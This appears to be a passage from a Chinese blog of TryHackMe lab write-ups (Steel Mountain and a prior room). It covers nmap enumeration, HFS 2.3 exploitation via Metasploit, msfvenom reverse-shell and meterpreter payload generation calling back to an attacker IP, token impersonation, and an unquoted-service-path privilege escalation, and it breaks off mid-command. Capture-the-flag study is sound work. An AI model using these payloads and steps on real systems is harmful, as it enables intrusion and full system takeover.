可以直接在cmd中执行windows下载命令下载exe到本地然后执行就可以反弹shell<br>哦不搞错了我们要用meterpreter 应该用msf </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=IP LPORT=PORT -f exe -o shell-name.exe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">端口监听</span><br><span class="line">use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST your-thm-ip set LPORT listening-port run</span><br><span class="line"></span><br><span class="line">注意点 端口监听需要 payloads一致</span><br><span class="line"></span><br><span class="line">Start-Process &quot;shell_name.exe&quot;</span><br></pre></td></tr></table></figure><h2 id="提权-–"><a href="#提权-–" class="headerlink" title="提权 –&gt;"></a>提权 –&gt;</h2><table><thead><tr><th>windows提权</th><th><a href="windows%E4%B8%AA%E4%BA%BA%E6%9D%83%E9%99%90.md">windows个人权限</a></th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><table><thead><tr><th>权限提升</th><th>[[权限管理.md#whoami 命令]]</th></tr></thead></table><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;whoami /priv&quot;</span> </span><br><span class="line"></span><br><span class="line">- SeIncreaseQuotaPrivilege: 调整进程的内存配额权限，目前被禁用。</span><br><span class="line">- SeSecurityPrivilege: 管理审计和安全日志的权限，目前被禁用。</span><br><span class="line">- SeTakeOwnershipPrivilege: 接管文件或其他对象的权限，目前被禁用。</span><br><span class="line">- SeLoadDriverPrivilege: 载入和卸载设备驱动程序的权限，目前被禁用。</span><br><span class="line">- SeSystemProfilePrivilege: 为系统性能进行分析的权限，目前被禁用。</span><br><span class="line">- SeSystemtimePrivilege: 更改系统时间的权限，目前被禁用。</span><br><span class="line">- SeProfileSingleProcessPrivilege: 为单个进程创建性能分析的权限，目前被禁用。</span><br><span class="line">- SeIncreaseBasePriorityPrivilege: 增加进程的调度优先级的权限，目前被禁用。</span><br><span class="line">- SeCreatePagefilePrivilege: 创建页面文件的权限，目前被禁用。</span><br><span class="line">- SeBackupPrivilege: 备份文件和目录的权限，目前被禁用。</span><br><span class="line">- SeRestorePrivilege: 恢复文件和目录的权限，目前被禁用。</span><br><span class="line">- SeShutdownPrivilege: 关闭系统的权限，目前被禁用。</span><br><span class="line">- SeDebugPrivilege: 调试程序的权限，目前已启用。</span><br><span class="line">- SeSystemEnvironmentPrivilege: 修改固件环境值的权限，目前被禁用。</span><br><span class="line">- SeChangeNotifyPrivilege: 绕过遍历检查的权限，目前已启用。</span><br><span class="line">- SeRemoteShutdownPrivilege: 强制从远程系统关闭的权限，目前被禁用。</span><br><span class="line">- SeUndockPrivilege: 从停靠站中移除计算机的权限，目前被禁用。</span><br><span class="line">- SeManageVolumePrivilege: 执行卷维护任务的权限，目前被禁用。</span><br><span class="line">- SeImpersonatePrivilege: 身份验证后模拟客户端的权限，目前已启用。</span><br><span class="line">- SeCreateGlobalPrivilege: 创建全局对象的权限，目前已启用。</span><br><span class="line">- SeIncreaseWorkingSetPrivilege: 增加进程工作集的权限，目前被禁用。</span><br><span class="line">- SeTimeZonePrivilege: 更改时区的权限，目前被禁用。</span><br><span class="line">- SeCreateSymbolicLinkPrivilege: 创建符号链接的权限，目前被禁用。</span><br></pre></td></tr></table></figure><blockquote><p>利用load incognito 模块去打 这个是个隐身模块  </p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">list_tokens -g</span><br><span class="line">impersonate_token &quot;BUILTIN\Administrators&quot;</span><br></pre></td></tr></table></figure><blockquote><p>正如上述所说的我们的那个不仅需要个人的高权限令牌 更需要一个 高权限的进程<br>此时就会想到 使用migrate  迁移我们meterpreter的进程</p></blockquote><p>直接ps 查看最近的 进程直接看最高权限进程(喵的这么强大 meterpreter 直接可以使用migrate 直接可以迁移 进程到任意一个进程)<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240514212217.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240514212128.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tryhackme </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Thm-Steel-Mountain</title>
      <link href="/2024/05/14/thm-Steel-Mountain/"/>
      <url>/2024/05/14/thm-Steel-Mountain/</url>
      
        <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240514215439.png" alt="image.png"></p><table><thead><tr><th>机器<br></th><th>Steel Mountain 钢山</th></tr></thead><tbody><tr><td>状态</td><td>未知</td></tr><tr><td>系统</td><td>windows</td></tr><tr><td>详细信息</td><td>HttpFileServer 2.3 远程代码执行  getshell PowerUp.ps1 服务提权</td></tr><tr><td></td><td></td></tr></tbody></table><h3 id="枚举端口"><a href="#枚举端口" class="headerlink" title="枚举端口"></a>枚举端口</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Not shown: 989 closed ports</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">80/tcp    open  http</span><br><span class="line">135/tcp   open  msrpc</span><br><span class="line">139/tcp   open  netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds</span><br><span class="line">3389/tcp  open  ms-wbt-server</span><br><span class="line">8080/tcp  open  http-proxy</span><br><span class="line">49152/tcp open  unknown</span><br><span class="line">49153/tcp open  unknown</span><br><span class="line">49154/tcp open  unknown</span><br><span class="line">49155/tcp open  unknown</span><br><span class="line">49156/tcp open  unknown</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="开始前的小乐趣先🐍个人"><a href="#开始前的小乐趣先🐍个人" class="headerlink" title="开始前的小乐趣先🐍个人"></a>开始前的小乐趣先🐍个人</h3><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240426145608.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240426145853.png" alt="image.png"></p><blockquote><p>完美简单的 查找 </p></blockquote><h3 id="详细枚举信息"><a href="#详细枚举信息" class="headerlink" title="详细枚举信息"></a>详细枚举信息</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.60 ( https://nmap.org ) at 2024-04-26 08:00 BST</span><br><span class="line">Nmap scan report for ip-10-10-35-123.eu-west-1.compute.internal (10.10.35.123)</span><br><span class="line">Host is up (0.00041s latency).</span><br><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">80/tcp    open  http         Microsoft IIS httpd 8.5</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS/8.5</span><br><span class="line">|_http-title: Site does not have a title (text/html).</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">135/tcp   open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds</span><br><span class="line">3389/tcp  open  ssl          Microsoft SChannel TLS</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|  TLSSessionReq: </span><br><span class="line">|     f+Q4l</span><br><span class="line">|     steelmountain0</span><br><span class="line">|     240425063400Z</span><br><span class="line">|     241025063400Z0</span><br><span class="line">|     steelmountain0</span><br><span class="line">|     TANM</span><br><span class="line">|     (F!WM</span><br><span class="line">|     92kC</span><br><span class="line">|     1(G^y</span><br><span class="line">|     KNu!</span><br><span class="line">|     95V)</span><br><span class="line">|     $00</span><br><span class="line">|     ;iFf</span><br><span class="line">|     87&amp;j</span><br><span class="line">|     ~%*d7</span><br><span class="line">|     0CPT</span><br><span class="line">|_    AeCu</span><br><span class="line">| ssl-cert: Subject: commonName=steelmountain</span><br><span class="line">| Not valid before: 2024-04-25T06:34:00</span><br><span class="line">|_Not valid after:  2024-10-25T06:34:00</span><br><span class="line">|_ssl-date: 2024-04-26T07:02:06+00:00; 0s from scanner time.</span><br><span class="line">8080/tcp  open  http         HttpFileServer httpd 2.3</span><br><span class="line">|_http-server-header: HFS 2.3</span><br><span class="line">|_http-title: HFS /</span><br><span class="line">49152/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49153/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49154/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49155/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49156/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">。</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">## 无法识别 3389的 服务版本</span></span></span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port3389-TCP:V=7.60%I=7%D=4/26%Time=662B5139%P=x86_64-pc-linux-gnu%r(TL</span><br><span class="line">SF:SSessionReq,346,\x16\x03\x03\x03A\x02\0\0M\x03\x03f\+Q4l\xbd\xd2\xa6%\</span><br><span class="line">SF:xd0\x151\xaf\xf5\x8c\x19E,\x8b\xe9&gt;T\x02\xda\x9cP\x07:4\x04\xa6\xf0\x20</span><br><span class="line">SF:;#\0\x002\x93\x1f\xa1\xeb\x9d\x15\xef&#123;\xf1%\x7f\x9d\xc4-\xca\x15\xf5\?\</span><br><span class="line">SF:xae\xa6\xff\x11\+\xd4\xd66a\0/\0\0\x05\xff\x01\0\x01\0\x0b\0\x02\xe8\0\</span><br><span class="line">SF:x02\xe5\0\x02\xe20\x82\x02\xde0\x82\x01\xc6\xa0\x03\x02\x01\x02\x02\x10</span><br><span class="line">SF:5\xf3\xaa\xabz~\*\xaeF\xf3\xc9yp\xb62\xa10\r\x06\t\*\x86H\x86\xf7\r\x01</span><br><span class="line">SF:\x01\x05\x05\x000\x181\x160\x14\x06\x03U\x04\x03\x13\rsteelmountain0\x1</span><br><span class="line">SF:e\x17\r240425063400Z\x17\r241025063400Z0\x181\x160\x14\x06\x03U\x04\x03</span><br><span class="line">SF:\x13\rsteelmountain0\x82\x01\&quot;0\r\x06\t\*\x86H\x86\xf7\r\x01\x01\x01\x0</span><br><span class="line">SF:5\0\x03\x82\x01\x0f\x000\x82\x01\n\x02\x82\x01\x01\0\xa4\x93\xd2\x83\xc</span><br><span class="line">SF:5K\xfde\xe5\|C4\xff\x06u\xde%\xf8\xb4Z\x1e\xdb\xbf\xa2\x8b\xf4\x8f7\xdf</span><br><span class="line">SF:R\xfec\xe1g&#125;u\x0e\xf8A9\xe8\x0cc\xb1\xca\xce\x9b\x1fp\x19\xcc\x97\x11\x</span><br><span class="line">SF:fc\x1c\xaa\xf0\x0c\x9e\x17\xd1\xa1\$\x93\xd2\xb6o\x20\x99Z\xfa\x89\xa9\</span><br><span class="line">SF:0C\x1b\x86\xfd\x8f\xba\(\xa4\.\xf6/\x03\xd1\xd9Bu\xbc\xd8&#125;,\xdcTANM\xe1</span><br><span class="line">SF:\xfe\x01\xae\x17\x1cK\xe4\xaa&#125;h\xcb\x8f!\xff\(F!WM\xfd\xfe\xe892kC\xa5\</span><br><span class="line">SF:x96\xaa1\(G\^y\xdfiZX\xa4#\x82\xbao\xe4\x85\&quot;Q,\xae\xc9\xcd\x98\xe3e\xf</span><br><span class="line">SF:5\x1d2`\xb2\x80KNu!\xe6\xd8F;\0\x1aau\xe5\x8d\xd7\xab\^\xd9\xc7\x04\x10</span><br><span class="line">SF:\xc6\x91\xa2\xb6\xc6\xa9\xda9;\xf6\xefw\xf1\x93N\x0ctL~\xc8\xc5\r\x1d\x</span><br><span class="line">SF:9dYpV\x82\x9d\xe0SG_\xd9\x11f\xf0\x196G\xc9\xe1\xd0M\n#\xec;\xff\x8fG#\</span><br><span class="line">SF:x04\x8c\xec8\xbf\xca\x84J\x97\xf5\xcd95V\)\xe3\xf6Q&#125;r\xbf\xee&#125;\x02\x03\</span><br><span class="line">SF:x01\0\x01\xa3\$0\&quot;0\x13\x06\x03U\x1d%\x04\x0c0\n\x06\x08\+\x06\x01\x05\</span><br><span class="line">SF:x05\x07\x03\x010\x0b\x06\x03U\x1d\x0f\x04\x04\x03\x02\x0400\r\x06\t\*\x</span><br><span class="line">SF:86H\x86\xf7\r\x01\x01\x05\x05\0\x03\x82\x01\x01\0%u\x97\xd5\x17M\x0f\xe</span><br><span class="line">SF:7\xcd\xf0\r\xd1;iFf\xd4\xf3\xbc\xd9c\0\xc7\x03\x91J\xd0&lt;d\x01\x08\xf6G_</span><br><span class="line">SF:l\x9dh\x89v\xf7\x14\x1a\xe0\xa7tr\x86\xed\xc6\xb0\xd6\xbb\x8b\xdaNT\xea</span><br><span class="line">SF:\xd2\x08\xf8\x8c\x0cF\x1e\x7f3\xd0\x85D\x9e\xb4\+\xa687&amp;j\x8fa2\x19\xa</span><br><span class="line">SF:c\xd9\x05\x15~%\*d7\x93\&quot;\xc4-\x11\xff0CPT\x86\x02\xd3m`\x07%\xeb\xa5\x</span><br><span class="line">SF:16\x17%=\xaa\xf6\x95WKB\x87\xa7H\x12\xb9\xcb\xd3\x88\x8c\xf5%\xd1\xd3\x</span><br><span class="line">SF:be\xd0\xf4\x05\xc0\x16\x93\xd1\x1eg\xf8\x94\x8f8\xc0J\xb8g\xf3\xe5\x8d\</span><br><span class="line">SF:xf8\xab\xbb\xf4\xc7v\x8c\+\xedMY\xab\xce\x1a\x9a\x83s\xdbk\xf1\x14E\xa8</span><br><span class="line">SF:AeCu\x9e\x93\x85\xb5\[\xcf\x8b\xf9\xa1\xd7\x8f\xf5tPT\xcb\xa6o8\xadQ\xc</span><br><span class="line">SF:9!\x87y\xd2=;\xe4o\x07\xedh\[\x0e\x9d\xb6\xf2\xaf\^\xfa\x89G\xc4\xcf&#125;\x</span><br><span class="line">SF:e5\xfc-\x8cg\xebZ@\*\xe1Al\x87x\xc0&#123;Hy\xab\xf5,\xf6\r\xe7\x154n\xff\xcb</span><br><span class="line">SF:\x0e\0\0\0);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">MAC Address: 02:46:B7:98:AF:B5 (Unknown)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Aggressive OS guesses: Microsoft Windows Server 2008 SP2 Datacenter Version (98%), Microsoft Windows Server 2012 (96%), Microsoft Windows Server 2012 R2 (96%), Microsoft Windows Server 2012 R2 Update 1 (96%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (96%), Microsoft Windows Vista SP1 (95%), Microsoft Windows Server 2012 or Server 2012 R2 (93%), Microsoft Windows Server 2008 R2 (93%), Microsoft Windows Home Server 2011 (Windows Server 2008 R2) (93%), Microsoft Windows Server 2008 SP1 (93%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 02:46:b7:98:af:b5 (unknown)</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2024-04-26 08:02:06</span><br><span class="line">|_  start_date: 2024-04-26 07:33:53</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="详细分析一下"><a href="#详细分析一下" class="headerlink" title="详细分析一下"></a>详细分析一下</h3><h5 id="80"><a href="#80" class="headerlink" title="80"></a>80</h5><blockquote><p>***1. <strong>Microsoft IIS httpd 8.5</strong>：该服务器运行的是Microsoft Internet Information Services（IIS）8.5版本，这是Microsoft的网络服务器软件。</p></blockquote><ol start="2"><li><p>*<strong>http-methods</strong>：</p><p> 这行提到可能的HTTP方法。<code>TRACE</code>是一种潜在危险的方法，它会将收到的HTTP请求返回给客户端，可能会被用于跨站追踪攻击（Cross-Site Tracing，XST）等攻击手法。</p></li></ol><h5 id="139-445"><a href="#139-445" class="headerlink" title="139 445"></a>139 445</h5><blockquote><p>告诉我们了操作系统<br>Microsoft Windows Server 2008 R2 - 2012 microsoft-ds</p></blockquote><h5 id="3389"><a href="#3389" class="headerlink" title="3389"></a>3389</h5><blockquote><p>根据你提供的扫描结果，看起来端口3389上运行的是Microsoft SChannel TLS服务，通常用于远程桌面连接（Remote Desktop Protocol，RDP）。以下是一些分析：</p></blockquote><ol><li><p>**<strong>3389&#x2F;tcp open ssl</strong>：这表示端口3389上运行的服务是基于SSL（Secure Sockets Layer）的，通常用于加密通信。在此情况下，它是Microsoft SChannel TLS，表明使用的是Windows的加密库。</p></li><li><p>*<strong>fingerprint-strings</strong>：这部分提供了一些TLS握手阶段的字符串。这些字符串可能有助于识别所使用的TLS版本或其他信息。</p></li><li><p>*<strong>ssl-cert</strong>：这是与SSL证书相关的信息。在这里，证书的主题(commonName)是 “steelmountain”，证书的有效期从 2024年4月25日到2024年10月25日。</p></li><li><p>*<strong>ssl-date</strong>：这是SSL证书的日期信息，显示了扫描时的日期和时间，以及与证书相关的时间间隔。</p></li></ol><h5 id="8080"><a href="#8080" class="headerlink" title="8080"></a>8080</h5><blockquote><p>端口8080上运行着HttpFileServer（HFS）2.3版本，这是一个基于HTTP协议的文件服务器软件。这意味着该服务器允许用户通过Web浏览器访问和管理文件。通过HTTP请求，用户可以上传、下载、删除和浏览服务器上的文件。在这种情况下，服务器的HTTP响应头中包含了”Server”字段，指示服务器版本为HFS 2.3。此外，HTTP响应标题显示为”HFS &#x2F;“，表明服务器根目录的标题为”HFS”。****<br>|</p></blockquote><table><thead><tr><th>8080端口的 HttpFileServer2.3远程代码执行</th><th><a href="HttpFileServer2.3.md">HttpFileServer2.3</a></th></tr></thead></table><h3 id="打点"><a href="#打点" class="headerlink" title="打点"></a>打点</h3><blockquote><p>8080 端口服务器HttpFileServer（HFS）2.3<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240426153448.png" alt="image.png"></p></blockquote><blockquote><p>启动msf  直接开始打<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240426154233.png" alt="image.png"><br>配置相关配置</p></blockquote><h3 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h3><blockquote><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240426215559.png" alt="image.png"></p></blockquote><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><table><thead><tr><th>首先先拿脚本信息收集</th><th><a href="%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.md#%E8%84%9A%E6%9C%AC%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">脚本信息收集</a></th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><blockquote><p>首先先下载 之后上传到 目标windows机器 </p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">upload /home/tom/get_power/windows/PowerUp.ps1</span><br><span class="line"></span><br></pre></td></tr></table></figure><table><thead><tr><th>METERPRETER 加载</th><th><a href="post.md#Load">Load</a></th></tr></thead></table><blockquote><p>load 加载 </p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; load Powershell</span><br><span class="line">Loading extension powershell...Success.</span><br><span class="line">meterpreter &gt; Powershell_shel</span><br><span class="line">[-] Unknown command: Powershell_shel</span><br><span class="line">meterpreter &gt; Powershell_shell</span><br><span class="line">[-] Unknown command: Powershell_shell</span><br><span class="line">meterpreter &gt; powershell_shell</span><br><span class="line"><span class="built_in">PS</span> &gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>执行扫描脚本<br> .\PowerUp.ps1<br> 开启脚本测试看到许多服务</p></blockquote><table><thead><tr><th>windows提权信息收集</th><th><a href="%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.md">信息收集</a></th></tr></thead><tbody><tr><td>windows提权服务提权</td><td><a href="%E6%9C%8D%E5%8A%A1%E6%8F%90%E6%9D%83.md">服务提权</a></td></tr><tr><td><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"> ServiceName    : AdvancedSystemCareService9</span><br><span class="line">Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe</span><br><span class="line">ModifiablePath : <span class="selector-tag">@</span>&#123;ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory&#125;</span><br><span class="line">StartName      : LocalSystem</span><br><span class="line">Abuse<span class="function"><span class="keyword">Function</span>  : <span class="title">Write-ServiceBinary</span> -<span class="title">Name</span> &#x27;<span class="title">AdvancedSystemCareService9</span>&#x27; -<span class="title">Path</span> &lt;<span class="title">HijackPath</span>&gt;</span></span><br><span class="line">CanRestart     : True</span><br><span class="line">Name           : AdvancedSystemCareService9</span><br><span class="line">Check          : Unquoted Service Paths</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## 解释</span></span><br><span class="line">- **ServiceName**：服务名称是 <span class="string">&quot;AdvancedSystemCareService9&quot;</span>。</span><br><span class="line">    </span><br><span class="line">- **Path**：该服务的路径是 <span class="string">&quot;C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe&quot;</span>。</span><br><span class="line">    </span><br><span class="line">- **ModifiablePath**：这里提到的可修改路径指的是 <span class="string">&quot;C:&quot;</span>，而且该路径上的权限是授予 <span class="string">&quot;BUILTIN\Users&quot;</span> 组的，具有“追加数据/添加子目录”的权限。这意味着系统中的普通用户组可能对这个路径具有一定的写权限。</span><br><span class="line">    </span><br><span class="line">- **StartName**：服务是以 <span class="string">&quot;LocalSystem&quot;</span> 账户启动的。这是 Windows 中权限最高的账户之一，通常用于系统服务。<span class="string">&quot;StartName&quot;</span> 表示服务启动时所使用的用户账户。在这个描述中，它指定了服务是以 <span class="string">&quot;LocalSystem&quot;</span> 账户启动的。<span class="string">&quot;LocalSystem&quot;</span> 是 Windows 中的一个内置账户，拥有系统最高的权限。这意味着该服务在启动时具有系统级别的权限，可以执行许多操作，包括访问系统资源和执行系统级任务，而不受用户权限限制。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">- **AbuseFunction**：该字段描述了一种潜在的滥用方式，即通过 `Write<span class="literal">-ServiceBinary</span>` 命令向这个服务的路径写入二进制文件。这种滥用可能导致恶意程序被注入到服务中。</span><br><span class="line">    </span><br><span class="line">- **CanRestart**：表示该服务可以重新启动。</span><br><span class="line">    </span><br><span class="line">- **Check**：描述这个服务存在的潜在风险是 <span class="string">&quot;Unquoted Service Paths&quot;</span>，即未加引号的服务路径。这可能导致路径混淆，并被恶意攻击利用。</span><br></pre></td></tr></table></figure></td><td></td></tr></tbody></table><blockquote><p>根据服务的信息收集来看我们已经 找到了 一个可以写的路径</p></blockquote><h3 id="载荷投递"><a href="#载荷投递" class="headerlink" title="载荷投递"></a>载荷投递</h3><h5 id="载荷生成"><a href="#载荷生成" class="headerlink" title="载荷生成"></a>载荷生成</h5><table><thead><tr><th>msf生成木马</th><th><a href="msfvenom.md#Encoders%20%E7%BC%96%E7%A0%81">Encoders 编码</a></th></tr></thead><tbody><tr><td></td><td></td></tr><tr><td></td><td></td></tr></tbody></table><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">## 先看一下系统信息systeminfo</span></span></span><br><span class="line">System Boot Time:          4/27/2024, 1:07:47 AM</span><br><span class="line">System Manufacturer:       Xen</span><br><span class="line">System Model:              HVM domU</span><br><span class="line">System Type:               x64-based PC</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">## 生成木马</span></span></span><br><span class="line"></span><br><span class="line">msfvenom  -p windows/x64/shell_reverse_tcp  LHOST=10.11.69.232 LPORT=4444  </span><br><span class="line">-f exe-service -o 